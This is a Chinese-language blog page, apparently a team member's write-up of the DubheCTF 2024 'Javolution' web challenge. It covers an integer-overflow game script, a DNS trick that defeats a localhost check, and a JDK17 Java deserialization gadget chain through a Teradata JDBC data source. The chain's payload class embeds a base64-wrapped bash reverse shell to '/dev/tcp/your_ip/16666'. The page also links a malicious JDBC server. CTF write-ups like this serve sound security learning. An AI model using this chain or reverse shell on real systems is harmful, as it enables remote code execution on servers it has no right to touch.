@@ -1,0 +1,868 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zer0peach">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="DubheCTF 2024 –Javolution前言心理原因，自己太菜了，导致自己不想或者说不敢去打XCTF，这次V&amp;N的各位佬火力全开，web 5&#x2F;6，都是血 但跟我一点关系没有，等到这个java上线后才开始看这道题 web中有两个xss，而且还混有脏东西（呜呜，会不了一点 其他也好难，不会，不想看 但这个java其实我也没多少贡献，唉。。。 unknown师傅做java的时">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Javolution">
+<meta property="og:url" content="https://zer0peach.github.io/2024/03/18/Javolution/index.html">
+<meta property="og:site_name" content="Zer0peach can&#39;t think">
+<meta property="og:description" content="DubheCTF 2024 –Javolution前言心理原因，自己太菜了，导致自己不想或者说不敢去打XCTF，这次V&amp;N的各位佬火力全开，web 5&#x2F;6，都是血 但跟我一点关系没有，等到这个java上线后才开始看这道题 web中有两个xss，而且还混有脏东西（呜呜，会不了一点 其他也好难，不会，不想看 但这个java其实我也没多少贡献，唉。。。 unknown师傅做java的时">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zer0peach.github.io/images/Javolution/image-20240318155751537.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Javolution/image-20240318155445477.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Javolution/image-20240318160421752.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Javolution/image-20240318160318011.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Javolution/image-20240318160622710.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Javolution/image-20240318160709098.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Javolution/image-20240318160750590.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Javolution/image-20240318161941676.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Javolution/image-20240318162214705.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Javolution/image-20240318163213092.png">
+<meta property="article:published_time" content="2024-03-17T16:00:43.000Z">
+<meta property="article:modified_time" content="2024-03-21T15:30:25.154Z">
+<meta property="article:author" content="Zer0peach">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zer0peach.github.io/images/Javolution/image-20240318155751537.png">
+  
+  
+  
+  <title>Javolution - Zer0peach can&#39;t think</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zer0peach.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zer0peach&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Javolution"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-03-18 00:00" pubdate>
+          2024年3月18日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          56 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Javolution</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="DubheCTF-2024-–Javolution"><a href="#DubheCTF-2024-–Javolution" class="headerlink" title="DubheCTF 2024 –Javolution"></a>DubheCTF 2024 –Javolution</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>心理原因，自己太菜了，导致自己不想或者说不敢去打XCTF，这次V&amp;N的各位佬火力全开，web 5&#x2F;6，都是血</p>
+<p>但跟我一点关系没有，等到这个java上线后才开始看这道题</p>
+<p>web中有两个xss，而且还混有脏东西（呜呜，会不了一点</p>
+<p>其他也好难，不会，不想看</p>
+<p>但这个java其实我也没多少贡献，唉。。。</p>
+<h2 id="unknown师傅做java的时间线"><a href="#unknown师傅做java的时间线" class="headerlink" title="unknown师傅做java的时间线"></a>unknown师傅做java的时间线</h2><blockquote>
+<p>检查jdk17中哪些gadget还能用的。</p>
+<p>检查过程中，jdk17中，不能像之前一样修改私有属性了，会报错。我的解决方法：设置agent，把该处判断hook掉，成功修改私有属性。</p>
+<p>然后是看gadget有哪些，最终还剩这些：</p>
+<p>EventListenerList：readObject -&gt; toString</p>
+<p>POJONode：toString -&gt; getter。</p>
+<p>此时是3.17 凌晨1点44分，先睡觉。</p>
+<p>第二天早上9点。</p>
+<p>尝试把TemplatesImpl放进POJONode，toString时报错，有关module的问题。</p>
+<p>此时我毫无缘由地想到套一层JDKDynamicProxy，成功执行getOutputProperties。</p>
+<p>接下来看如何加载字节码并new对象。</p>
+<p>debug发现，字节码可以进入define，但是define时会检查字节码的module，由于该字节码的类是继承了AbstractTranslet的，而AbstractTranslet所在的module没有open，所以define这里过不去。</p>
+<p>猜测module信息会被编译进字节码，此时我一个很大胆的想法：手动把module信息加进恶意字节码，让这个module变成能够访问AbstractTranslet的module。差了点资料，基本没有，放弃。</p>
+<p>此时的方向应该回到题目给的TeraDataSource#getConnection。</p>
+<p>能够实现令题目靶机jdbc连接vps了，此时是3.17 中午12点多。</p>
+<p>此时的想法：Java中rce的方法不多，TemplatesImpl加载字节码被封死了，还剩URLClassLoader远程类加载、JNDI，直接调Runtime执行命令的类，第三方库基本没有吧，这么危险，所以没有往这方面想。</p>
+<p>考虑JNDI加载beanfactory，试了下，tomcat版本太高，已经修复了BeanFactory。JNDI无。</p>
+<p>这里完全没有头绪了。</p>
+<p>一位队友发现了Tera里的Runtime，豁然开朗。此时是1点53分。不到30分钟路线已经找到，剩下的就是满足路线的条件。</p>
+<p> 开始debug。</p>
+<p>发现会发请求，得接收，不然会抛异常。好，一位队友起了个数据库环境，请求成功。</p>
+<p>发现会根据数据库响应的不同数据进入不同分支，好，抓包，手搓服务端。手搓完成，实现了1-2次交互，并能简单控制走向。</p>
+<p>后面，代码越来越复杂，不知如何构造响应数据。</p>
+<p>越来越红温。</p>
+<p>此时队友找到个现成的恶意服务端的代码，我草。此时是7点20分。</p>
+<p>8点16分，拿到flag。</p>
+</blockquote>
+<p>历时一天，我只能说太nb了</p>
+<p>鄙人唯一的贡献就是上面说到的发现Tera里的Runtime，这对当时没有头绪的unknown师傅也算指明了一条路</p>
+<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>故事的开始是那么的美好，有趣的打怪升级</p>
+<p>直接拿V&amp;N队里师傅的python脚本讲解一下</p>
+<div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> time
+<span class="hljs-keyword">import</span> requests
+
+url = <span class="hljs-string">&quot;http://1.95.54.152:40957/pal&quot;</span> <span class="hljs-comment"># 初始化一级的人物</span>
+
+
+<span class="hljs-comment"># battle depresso up 10 level</span>
+url1 = url + <span class="hljs-string">&quot;/battle/depresso&quot;</span>   <span class="hljs-comment">#升到10级</span>
+<span class="hljs-built_in">print</span>(url1)
+<span class="hljs-built_in">print</span>(requests.get(url1).text)
+
+
+time.sleep(<span class="hljs-number">0.5</span>)
+<span class="hljs-comment"># capture Mammorest</span>
+url3 = url + <span class="hljs-string">&quot;/capture?name=mammorest&quot;</span>   <span class="hljs-comment">#修改数值也打不过，但是可以捕捉高自己10级的boss</span>
+<span class="hljs-built_in">print</span>(requests.get(url3).text)
+time.sleep(<span class="hljs-number">0.5</span>)
+
+url4 = url + <span class="hljs-string">&quot;/capture?name=Grizzbolt&quot;</span>  <span class="hljs-comment">#继续捕捉</span>
+<span class="hljs-built_in">print</span>(requests.get(url4).text)
+time.sleep(<span class="hljs-number">0.5</span>)
+
+<span class="hljs-comment">#目前为止是30级，但下一个boss是50级，打也打不过，抓也抓不了</span>
+
+
+
+<span class="hljs-comment"># change defense and hp</span>
+url2 = url + <span class="hljs-string">&quot;/cheat?hp=6000&amp;defense=-2147483645&quot;</span>  <span class="hljs-comment">#修改自己防御为负数</span>
+<span class="hljs-built_in">print</span>(requests.get(url2).text)
+time.sleep(<span class="hljs-number">0.5</span>)
+
+
+
+battle_jetragon = url + <span class="hljs-string">&quot;/battle/jetragon&quot;</span>   <span class="hljs-comment">#这里就利用int的强制类型转化导致的负数溢出为了整数</span>
+<span class="hljs-built_in">print</span>(requests.get(battle_jetragon).text)
+
+<span class="hljs-comment">#这里就到了50级，就可以了</span>
+
+battle_flag = url + <span class="hljs-string">&quot;/battle/flag&quot;</span>
+<span class="hljs-built_in">print</span>(requests.get(battle_flag).text)
+
+show = url + <span class="hljs-string">&quot;/show&quot;</span>
+<span class="hljs-built_in">print</span>(requests.get(show).text)</code></pre></div>
+
+<p><img src="/../images/Javolution/image-20240318155751537.png" srcset="/img/loading.gif" lazyload alt="image-20240318155751537"></p>
+<p>整数溢出的漏洞</p>
+<p><img src="/../images/Javolution/image-20240318155445477.png" srcset="/img/loading.gif" lazyload alt="image-20240318155445477"></p>
+<p>做到这一步我和V&amp;N里的另一个师傅进度差不多，他把步骤写到协助文档里了，等于说我啥贡献都没有，唉毕竟人人都会（呜呜</p>
+<h2 id="接着"><a href="#接着" class="headerlink" title="接着"></a>接着</h2><p>我们升到50级就是为了这里</p>
+<p><img src="/../images/Javolution/image-20240318160421752.png" srcset="/img/loading.gif" lazyload alt="image-20240318160421752"></p>
+<p><img src="/../images/Javolution/image-20240318160318011.png" srcset="/img/loading.gif" lazyload alt="image-20240318160318011"></p>
+<p>host中要有dubhe，而且又要判断ip为127.0.0.1</p>
+<p>那就设置一个子域名有dubhe的域名，然后给他个A记录设置为127.0.0.1 （unknown师傅太强了</p>
+<p><img src="/../images/Javolution/image-20240318160622710.png" srcset="/img/loading.gif" lazyload alt="image-20240318160622710"></p>
+<h2 id="重头戏"><a href="#重头戏" class="headerlink" title="重头戏"></a>重头戏</h2><p>然后就能够进行反序列化了</p>
+<p><img src="/../images/Javolution/image-20240318160709098.png" srcset="/img/loading.gif" lazyload alt="image-20240318160709098"></p>
+<p>但关键是java版本是17啊。。。。。。。</p>
+<p><img src="/../images/Javolution/image-20240318160750590.png" srcset="/img/loading.gif" lazyload alt="image-20240318160750590"></p>
+<p>然后就是找toString链子，以及调用什么getter</p>
+<p>这里我直接摆烂，jdk17的什么module会不了一点</p>
+<p>这里就是unknown搞出来的</p>
+<p>设置agent，把jdk17判断判断反射处的逻辑hook掉，成功修改私有属性。</p>
+<p>然后是看gadget有哪些，最终还剩这些：</p>
+<p>EventListenerList：readObject -&gt; toString  （看到有这个我人快傻掉了，明明说好jdk17不行的。。。。</p>
+<p>POJONode：toString -&gt; getter。</p>
+<p>然后unknown师傅继续尝试TemplatesImpl，但实际上是用不了的</p>
+<p>高版本JDK中TemplatesImpl已经被移除，或者说无法使用</p>
+<p>然后目标就转到PalDataSource的getConnection方法上</p>
+<h2 id="我的唯一贡献"><a href="#我的唯一贡献" class="headerlink" title="我的唯一贡献"></a>我的唯一贡献</h2><p>当时到这里就没有进度了，那反正我就半摆烂地debug源码</p>
+<p>一步步跟进去，结果真让我发现个Runtime，哈哈哈哈哈哈哈</p>
+<p><img src="/../images/Javolution/image-20240318161941676.png" srcset="/img/loading.gif" lazyload alt="image-20240318161941676"></p>
+<p>unknown把我发他的截图放到协作文档中，也算有了个参与感吧</p>
+<p>路线：</p>
+<p>TeraDataSourceBase.createNewConnection –&gt; ConnectionFactory.createConnection new RawConnection —&gt; RawConnection构造函数引用父类构造GenericTeradataConnection  —&gt; GenericTeradataConnection构造函数—&gt;RCE</p>
+<p>然后就要看如何走到这一步了</p>
+<p>逻辑很简单，但本地运行会卡住</p>
+<p>卡在这一步</p>
+<p><img src="/../images/Javolution/image-20240318162214705.png" srcset="/img/loading.gif" lazyload alt="image-20240318162214705"></p>
+<p>根据分析应该是要连接上数据库</p>
+<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>继续摆，不会搭建Teradata数据库</p>
+<p>unknown他们自己搭数据库环境，甚至自己抓包，写恶意服务端，越到后面越不知道服务端怎么写。最后发现有现成的</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/luelueking/Deserial_Sink_With_JDBC">https://github.com/luelueking/Deserial_Sink_With_JDBC</a></p>
+<p>这一波典中典，又有写好的恶意服务端</p>
+<p>本地的PalDataSource，好像说包名也要一样（不清楚</p>
+<div class="code-wrapper"><pre><code class="hljs Bash">public class PalDataSource extends TeraDataSource &#123;
+
+    public <span class="hljs-function"><span class="hljs-title">PalDataSource</span></span>()&#123;
+        String cmd = <span class="hljs-string">&quot;bash -i &gt;&amp;/dev/tcp/your_ip/16666 0&gt;&amp;1&quot;</span>;
+        String <span class="hljs-built_in">command</span> = <span class="hljs-string">&quot;bash -c &#123;echo,&quot;</span>+Base64.getEncoder().encodeToString(cmd.getBytes())+<span class="hljs-string">&quot;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>;
+        System.out.println(<span class="hljs-built_in">command</span>);
+        setBROWSER(<span class="hljs-built_in">command</span>);
+        setLOGMECH(<span class="hljs-string">&quot;BROWSER&quot;</span>);
+        setDSName(<span class="hljs-string">&quot;your_ip&quot;</span>);
+        setDbsPort(<span class="hljs-string">&quot;10250&quot;</span>);
+    &#125;
+
+    @Override // com.teradata.jdbc.TeraDataSource, javax.sql.DataSource
+    public Connection getConnection(String username, String password) throws SQLException &#123;
+        <span class="hljs-built_in">return</span> super.getConnection(username, password);
+    &#125;
+
+    @Override // com.teradata.jdbc.TeraDataSourceBase, javax.sql.CommonDataSource
+    public Logger getParentLogger() throws SQLFeatureNotSupportedException &#123;
+        <span class="hljs-built_in">return</span> null;
+    &#125;
+&#125;</code></pre></div>
+
+<p>unknown给出的poc （前面说到他自己用了个agent，所以要加载才能使用</p>
+<p>并且动态代理那里改为<code>DataSource.class</code>也很细节</p>
+<div class="code-wrapper"><pre><code class="hljs Bash">public static void setFieldValue(Object obj, String fieldname, Object value) throws Exception, IllegalAccessException &#123;
+    Field field = getField(obj.getClass(), fieldname);
+    <span class="hljs-keyword">if</span> (field == null) &#123;
+        throw new Exception(<span class="hljs-string">&quot;field &quot;</span> + fieldname + <span class="hljs-string">&quot;not found!&quot;</span>);
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        field.setAccessible(<span class="hljs-literal">true</span>);
+        field.set(obj, value);
+    &#125;
+&#125;
+public static Field getField(Class&lt;?&gt; clazz, String fieldName) &#123;
+    Field field = null;
+
+    try &#123;
+        field = clazz.getDeclaredField(fieldName);
+        field.setAccessible(<span class="hljs-literal">true</span>);
+    &#125; catch (NoSuchFieldException var4) &#123;
+        <span class="hljs-keyword">if</span> (clazz.getSuperclass() != null) &#123;
+            field = getField(clazz.getSuperclass(), fieldName);
+        &#125;
+    &#125;
+
+    <span class="hljs-built_in">return</span> field;
+&#125;
+public static Object unserialize(byte[] bytes) throws Exception &#123;
+    ObjectInputStream <span class="hljs-keyword">in</span> = new ObjectInputStream(new ByteArrayInputStream(bytes));
+    <span class="hljs-built_in">return</span> in.readObject();
+&#125;
+public static byte[] serialize(Object obj) throws Exception &#123;
+    ByteArrayOutputStream bytes = new ByteArrayOutputStream();
+    ObjectOutputStream out = new ObjectOutputStream(bytes);
+    out.writeObject(obj);
+    <span class="hljs-built_in">return</span> bytes.toByteArray();
+&#125;
+
+public static Object getPOJONodeStableProxy(Object templatesImpl) throws Exception &#123;
+    Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);
+    Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
+    cons.setAccessible(<span class="hljs-literal">true</span>);
+    AdvisedSupport advisedSupport = new AdvisedSupport();
+    advisedSupport.setTarget(templatesImpl);
+    InvocationHandler handler = (InvocationHandler)cons.newInstance(advisedSupport);
+    Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]&#123;DataSource.class&#125;, handler);
+    <span class="hljs-built_in">return</span> proxyObj;
+&#125;
+
+public static void main( String[] args )throws Exception &#123;
+
+    PalDataSource palDataSource = new PalDataSource();
+    Object pojoNodeStableProxy = getPOJONodeStableProxy(palDataSource);
+    POJONode jsonNodes = new POJONode(pojoNodeStableProxy);
+    EventListenerList list = new EventListenerList();
+
+    UndoManager manager = new UndoManager();
+    Vector vector = (Vector) Util.getFieldValue(manager, <span class="hljs-string">&quot;edits&quot;</span>);
+    vector.add(jsonNodes);
+    setFieldValue(list, <span class="hljs-string">&quot;listenerList&quot;</span>, new Object[]&#123;InternalError.class, manager&#125;);
+
+    System.out.println(Util.URLEncode(Base64.getEncoder().encodeToString(serialize(list))));
+&#125;</code></pre></div>
+
+
+
+<p><img src="/../images/Javolution/image-20240318163213092.png" srcset="/img/loading.gif" lazyload alt="image-20240318163213092"></p>
+<h1 id="其他战队WP"><a href="#其他战队WP" class="headerlink" title="其他战队WP"></a>其他战队WP</h1><p>域名那里可以不用自己去弄，<code>sudo.cc</code>本就是执行<code>localhost</code>的，所以<code>dubhe.sudo.cc</code>即可</p>
+<p>然后就是关键的jdk17如何造链子，做法贼简单</p>
+<p>在vm-option加上</p>
+<div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-attr">--add-opens</span> java.base/java.util=ALL-UNNAMED <span class="hljs-attr">--add-exports</span>  java.xml/com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xpath</span><span class="hljs-selector-class">.internal</span>.objects=ALL-UNNAMED</code></pre></div>
+
+<p>即可</p>
+<p>woc，我看这个东西的时候是讲的jdk9，我以为jdk17就不行了，服了</p>
+<p>然后可以使用XString的toString链子</p>
+<p>但是好像不能实例化（TEL✌用的反射，然后配合上面这个vm-option）</p>
+<p>好像也没啥了</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Javolution</div>
+      <div>https://zer0peach.github.io/2024/03/18/Javolution/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zer0peach</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年3月18日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/03/18/VCTF2024/" title="VCTF2024">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">VCTF2024</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/03/08/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/" title="Hibernate利用链">
+                        <span class="hidden-mobile">Hibernate利用链</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <a href="https://zer0peach.github.io"><span>author:Zer0peach</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
